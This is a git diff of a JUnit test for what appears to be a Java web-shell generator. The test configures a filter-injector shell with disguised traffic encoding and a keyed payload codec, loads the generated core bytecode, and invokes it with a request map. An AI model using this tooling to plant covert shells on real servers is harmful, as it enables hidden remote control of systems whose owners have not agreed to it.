@@ -2,12 +2,11 @@ package org.leo.jmg;
 
 import org.junit.jupiter.api.Test;
 import org.leo.core.entity.Disguise;
+import org.leo.core.payload.PayloadCodec;
 import org.leo.jmg.core.LeoCore;
 
-import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -19,15 +18,13 @@ class EnvelopeCoreCompatibilityTest {
     @Test
     void generatedCoreExecutesEnvelopeRequest() throws Exception {
         Disguise request = new Disguise();
-        request.setDecodeBody("public java.util.HashMap decode(byte[] data) throws Exception {"
-                + "java.io.ObjectInputStream in=new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(data));"
-                + "return (java.util.HashMap)in.readObject();}");
+        request.setTrafficDecodeBody(
+                "public byte[] decodeTraffic(byte[] data){return data;}");
         Disguise response = new Disguise();
-        response.setEncodeBody("public byte[] encode(java.util.HashMap data) throws Exception {"
-                + "java.io.ByteArrayOutputStream out=new java.io.ByteArrayOutputStream();"
-                + "java.io.ObjectOutputStream stream=new java.io.ObjectOutputStream(out);"
-                + "stream.writeObject(data);stream.close();return out.toByteArray();}");
+        response.setTrafficEncodeBody(
+                "public byte[] encodeTraffic(byte[] data){return data;}");
         ShellGeneratorConfig config = ShellGeneratorConfig.builder(request, response)
+                .payloadKey("envelope-test-key")
                 .coreClassName("org.example.EnvelopeCore")
                 .shellClassName("org.example.EnvelopeShell")
                 .injectorClassName("org.example.EnvelopeInjector")
@@ -36,7 +33,7 @@ class EnvelopeCoreCompatibilityTest {
                 .shellType("FilterInjector")
                 .packerType("DefaultBase64")
                 .build();
-        byte[] bytecode = new LeoCore(request, response)
+        byte[] bytecode = new LeoCore(request, response, "envelope-test-key")
                 .genLeoCoreByClassName(config.getCoreClassName(), config);
         Object core = new Loader().define(bytecode).getDeclaredConstructor().newInstance();
 
@@ -70,12 +67,14 @@ class EnvelopeCoreCompatibilityTest {
     @SuppressWarnings("unchecked")
     private Map<String, Object> invoke(Object core, Map<String, Object> request) throws Exception {
         ByteArrayOutputStream wire = new ByteArrayOutputStream();
-        ObjectOutputStream output = new ObjectOutputStream(wire);
-        output.writeObject(request);
-        output.close();
-        core.equals(wire);
-        ObjectInputStream input = new ObjectInputStream(new ByteArrayInputStream(wire.toByteArray()));
-        return (Map<String, Object>) input.readObject();
+        wire.write(new PayloadCodec("envelope-test-key").encode(request));
+        try {
+            ((InvocationHandler) core).invoke(null, null, new Object[]{wire});
+        } catch (Throwable e) {
+            throw new AssertionError("Core invocation failed", e);
+        }
+        return (Map<String, Object>) new PayloadCodec("envelope-test-key")
+                .decode(wire.toByteArray());
     }
 
     private static final class Loader extends ClassLoader {
